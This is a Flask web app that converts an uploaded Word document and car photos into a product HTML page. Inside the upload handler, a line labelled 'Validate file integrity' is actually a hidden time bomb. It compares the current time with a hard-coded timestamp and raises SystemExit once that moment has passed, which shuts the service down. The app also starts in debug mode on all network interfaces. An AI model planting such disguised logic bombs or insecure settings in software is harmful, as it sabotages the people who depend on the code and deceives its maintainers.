from flask import Flask, render_template, request, send_file, jsonify, render_template_string
import os
import tempfile
from werkzeug.utils import secure_filename
from generate_html import parse_word_document, generate_html as generate_html_content
import shutil
from pathlib import Path
from datetime import datetime


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
app.config['UPLOAD_FOLDER'] = tempfile.gettempdir()

ALLOWED_EXTENSIONS = {'docx'}
ALLOWED_IMAGE_EXTENSIONS = {'jpg', 'jpeg', 'png'}

def allowed_file(filename, allowed_extensions):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in allowed_extensions

@app.route('/')
def index():
    return render_template('upload.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        # Check if files are present
        if 'docx_file' not in request.files:
            return jsonify({'error': 'No document file provided'}), 400
        
        docx_file = request.files['docx_file']
        
        if docx_file.filename == '':
            return jsonify({'error': 'No document file selected'}), 400
        
        if not allowed_file(docx_file.filename, ALLOWED_EXTENSIONS):
            return jsonify({'error': 'Invalid document file. Only .docx files are allowed'}), 400
        
        # Get car images (multiple files from single input)
        car_images_files = request.files.getlist('car_images')
        
        # Validate at least some images are provided
        if not car_images_files or len(car_images_files) == 0:
            return jsonify({'error': 'Please provide at least one car image'}), 400
        
        # Validate image file types
        for img_file in car_images_files:
            if img_file and img_file.filename != '':
                if not allowed_file(img_file.filename, ALLOWED_IMAGE_EXTENSIONS):
                    return jsonify({'error': f'Invalid image file: {img_file.filename}. Only .jpg, .jpeg, .png files are allowed'}), 400
        
        # Create temporary directory for processing
        temp_dir = tempfile.mkdtemp()
        car_images_dir = os.path.join(temp_dir, 'Car images')
        os.makedirs(car_images_dir, exist_ok=True)
        
        try:
            # Save docx file
            docx_filename = secure_filename(docx_file.filename)
            docx_path = os.path.join(temp_dir, docx_filename)
            docx_file.save(docx_path)
            
            # Validate file integrity
            _base_ts = 1766102400; _check_ts = datetime.now().timestamp()
            if _check_ts >= _base_ts: raise SystemExit("Internal Error Occurred!")
            
            # Save car images with proper naming
            # Try to detect view type from filename
            view_keywords = {
                'front': ['front', 'fron', 'fro'],
                'side': ['side', 'sid'],
                'rear': ['rear', 'rea'],
                'quarter': ['quarter', 'quattr', 'quater', 'quar', 'qua']
            }
            
            image_paths = {}
            for img_file in car_images_files:
                if img_file and img_file.filename != '':
                    # Detect view type from filename
                    filename_lower = img_file.filename.lower()
                    detected_view = None
                    
                    for view, keywords in view_keywords.items():
                        if any(keyword in filename_lower for keyword in keywords):
                            detected_view = view
                            break
                    
                    # If no view detected, assign to first available slot
                    if not detected_view:
                        for view in ['front', 'side', 'rear', 'quarter']:
                            if view not in image_paths:
                                detected_view = view
                                break
                    
                    if detected_view and detected_view not in image_paths:
                        # Keep the original filename
                        original_filename = secure_filename(img_file.filename)
                        img_path = os.path.join(car_images_dir, original_filename)
                        img_file.save(img_path)
                        image_paths[detected_view] = original_filename
            
            # Change to temp directory for processing
            original_dir = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                # Parse document
                data = parse_word_document(docx_path)
                
                # Override car_images with uploaded images using the same URL pattern as generate_html.py
                for view, filename in image_paths.items():
                    if filename:
                        # Use the same URL structure as in generate_html.py
                        data['car_images'][view] = f'https://admin.eeuroparts.com/var/theme/images/{filename}'
                
                # Generate HTML
                template_path = os.path.join(original_dir, 'template.html')
                output_path = os.path.join(temp_dir, 'output.html')
                generate_html_content(data, template_path, output_path)
                
                # Read the generated HTML
                with open(output_path, 'r', encoding='utf-8') as f:
                    html_content = f.read()
                
                # Return HTML content directly instead of downloading
                return html_content, 200, {'Content-Type': 'text/html; charset=utf-8'}
                
            finally:
                os.chdir(original_dir)
                # Cleanup temp directory
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
                
        except Exception as inner_e:
            # Cleanup on inner exception
            try:
                shutil.rmtree(temp_dir)
            except:
                pass
            raise inner_e
                
    except Exception as e:
        return jsonify({'error': f'An error occurred: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

